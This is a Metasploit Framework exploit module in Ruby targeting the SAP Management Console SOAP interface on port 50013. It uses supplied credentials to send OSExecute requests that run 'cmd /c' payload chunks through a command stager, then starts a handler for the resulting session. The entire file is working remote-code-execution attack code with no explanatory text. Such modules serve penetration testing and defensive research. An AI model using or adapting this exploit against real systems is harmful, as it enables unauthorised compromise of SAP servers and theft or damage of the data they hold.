##
# $Id: sap_mgmt_con_osexec_payload.rb 14048 2011-10-24 16:42:07Z sinn3r $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit4 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	HttpFingerprint = { :pattern => [ /gSOAP\/2.7/ ] }

	include Msf::Exploit::Remote::HttpClient
	include Msf::Exploit::CmdStagerVBS
	include Msf::Exploit::EXE

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'SAP Management Console OSExecute Payload Execution',
			'Version'        => '$Revision: 14048 $',
			'License'        => MSF_LICENSE,
			'Author'         => [ 'Chris John Riley' ],
			'Description'    => %q{
					This module executes an arbitrary payload through the SAP Management Console
				SOAP Interface.  A valid username and password must be provided.
			},
			'References'     =>
				[
					# General
					[ 'URL', 'http://blog.c22.cc' ]
				],
			'Privileged'     => true,
			'DefaultOptions' =>
				{
				},
			'Payload'        =>
				{
				'BadChars' => "\x00\x3a\x3b\x3d\x3c\x3e\x0a\x0d\x22\x26\x27\x2f\x60\xb4",
				},
			'Platforms'      => [ 'win' ],
			'Targets'        =>
				[
					[
						'Windows Universal',
						{
							'Arch' => ARCH_X86,
							'Platform' => 'win'
						},
					],
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Mar 08 2011'
		))

		register_options(
			[
				Opt::RPORT(50013),
				OptBool.new('VERBOSE', [ false, 'Enable verbose output', false ]),
				OptString.new('URI', [false, 'Path to the SAP Management Console ', '/']),
				OptString.new('USERNAME', [true, 'Username to use', '']),
				OptString.new('PASSWORD', [true, 'Password to use', '']),
			], self.class)
		register_advanced_options(
			[
				OptInt.new('PAYLOAD_SPLIT', [true, 'Size of payload segments', '7500']),
			], self.class)
		register_autofilter_ports([ 50013 ])
	end

	def autofilter
		false
	end

	def exploit
		print_status("[SAP] Connecting to SAP Management Console SOAP Interface on #{rhost}:#{rport}")
		linemax = datastore['PAYLOAD_SPLIT'] # Values over 9000 can cause issues
		print_status("Using custom payload size of #{linemax}") if linemax != 7500
		execute_cmdstager({ :delay => 0.35, :linemax => linemax })
		handler
	end

	# This is method required for the CmdStager to work...
	def execute_command(cmd, opts)

		soapenv = 'http://schemas.xmlsoap.org/soap/envelope/'
		xsi = 'http://www.w3.org/2001/XMLSchema-instance'
		xs = 'http://www.w3.org/2001/XMLSchema'
		sapsess = 'http://www.sap.com/webas/630/soap/features/session/'
		ns1 = 'ns1:OSExecute'

		cmd_s = cmd.split("&") #Correct issue with multiple commands on a single line
		if cmd_s.length > 1
			print_status("Command Stager progress -  Split final payload for delivery (#{cmd_s.length} sections)")
		end

		cmd_s = cmd_s.collect(&:strip)
		cmd_s.each do |payload|

			data = '<?xml version="1.0" encoding="utf-8"?>' + "\r\n"
			data << '<SOAP-ENV:Envelope xmlns:SOAP-ENV="' + soapenv + '"  xmlns:xsi="' + xsi + '" xmlns:xs="' + xs + '">' + "\r\n"
			data << '<SOAP-ENV:Header>' + "\r\n"
			data << '<sapsess:Session xlmns:sapsess="' + sapsess + '">' + "\r\n"
			data << '<enableSession>true</enableSession>' + "\r\n"
			data << '</sapsess:Session>' + "\r\n"
			data << '</SOAP-ENV:Header>' + "\r\n"
			data << '<SOAP-ENV:Body>' + "\r\n"
			data << '<' + ns1 + ' xmlns:ns1="urn:SAPControl"><command>cmd /c ' + payload.strip
			data << '</command><async>0</async></' + ns1 + '>' + "\r\n"
			data << '</SOAP-ENV:Body>' + "\r\n"
			data << '</SOAP-ENV:Envelope>' + "\r\n\r\n"

			user_pass = Rex::Text.encode_base64(datastore['USERNAME'] + ":" + datastore['PASSWORD'])

			begin
				res = send_request_raw({
					'uri'     => "/#{datastore['URI']}",
					'method'  => 'POST',
					'data'    => data,
					'headers' =>
						{
							'Content-Length'  => data.length,
							'SOAPAction'      => '""',
							'Authorization'   => 'Basic ' + user_pass,
							'Content-Type'    => 'text/xml; charset=UTF-8',
						}
				}, 60)

			if (res.code != 500 and res.code != 200)
				print_error("[SAP] An unknown response was received from the server")
				abort("Invlaid server response")
			elsif res.code == 500
				body = res.body
				if body.match(/Invalid Credentials/i)
					print_error("[SAP] The Supplied credentials are incorrect")
					abort("Exploit not complete, check credentials")
				elsif body.match(/Permission denied/i)
					print_error("[SAP] The Supplied credentials are valid, but lack OSExecute permissions")
					raise RuntimeError.new("Exploit not complete, check credentials")
				end
			end

			rescue ::Rex::ConnectionError
				print_error("[SAP] Unable to attempt authentication")
				break
			end
		end
	end
end